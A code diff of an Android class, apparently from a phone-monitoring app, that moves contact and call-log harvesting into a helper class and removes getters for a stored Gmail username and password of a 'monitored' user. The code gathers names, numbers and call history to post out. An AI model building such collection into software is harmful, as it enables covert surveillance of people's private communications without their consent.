@@ -5,7 +5,6 @@ import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
 import android.location.Location;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -14,8 +13,6 @@ import android.os.AsyncTask;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.preference.PreferenceManager;
-import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 import java.io.BufferedInputStream;
@@ -61,71 +58,14 @@ class PostPHP extends AsyncTask<String[], Void, Void> {
     private String conCat(Context c){
         SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
         String returnString = "";
+        Logs l = new Logs(c);
         if (settings.getBoolean("include_contacts", false)) {
-            returnString += c.getString(R.string.contacts_param) + getContacts();
+            returnString += c.getString(R.string.contacts_param) + l.getContacts();
         }
         if (settings.getBoolean("include_calllog", false)) {
-            returnString += c.getString(R.string.calls_param) + getCallLog();
+            returnString += c.getString(R.string.calls_param) + l.getCallLog(999);
         }
         return returnString;
-    }
-    private String getContacts() {
-        Cursor phones = c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-        StringBuilder contacts = new StringBuilder();
-        if (phones != null) {
-            while (phones.moveToNext()) {
-                contacts.append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" , ")
-                        .append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
-            }
-            phones.close();
-        }
-        return contacts.toString(); //check if file is null when attaching
-    }
-
-    private String getCallLog() {
-        StringBuilder content = new StringBuilder();
-        if (ActivityCompat.checkSelfPermission(c, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-            Cursor calllog = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
-            if (calllog != null) {
-                while (calllog.moveToNext()) {
-                    String type;
-
-                    switch (Integer.parseInt(calllog.getString(calllog.getColumnIndex(CallLog.Calls.TYPE)))) {
-                        case CallLog.Calls.OUTGOING_TYPE:
-                            type = c.getString(R.string.outgoing);
-                            break;
-
-                        case CallLog.Calls.INCOMING_TYPE:
-                            type = c.getString(R.string.incoming);
-                            break;
-
-                        case CallLog.Calls.MISSED_TYPE:
-                            type = c.getString(R.string.missed);
-                            break;
-                        default:
-                            type = c.getString(R.string.error);
-                            break;
-                    }
-                    content.append(c.getString(R.string.num)).append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.NUMBER)))
-                            .append("\n").append(c.getString(R.string.call_date)).append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.DATE)))
-                            .append("\n").append(c.getString(R.string.call_time)).append(new Date((long) calllog.getColumnIndex(CallLog.Calls.DATE)))
-                            .append("\n").append(c.getString(R.string.call_duration)).append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.DURATION)))
-                            .append("\n").append(c.getString(R.string.call_type)).append(type).append("\n");
-                }
-            }
-            if (calllog != null) {
-                calllog.close();
-            }
-        }
-        return content.toString();
-    }
-
-    String getMonitoredUserName() {
-        return PreferenceManager.getDefaultSharedPreferences(c).getString("gmail_username", null);
-    }
-
-    String getMonitoredPassword() {
-        return PreferenceManager.getDefaultSharedPreferences(c).getString("gmail_password", null);
     }
 
     String getReceiver() {
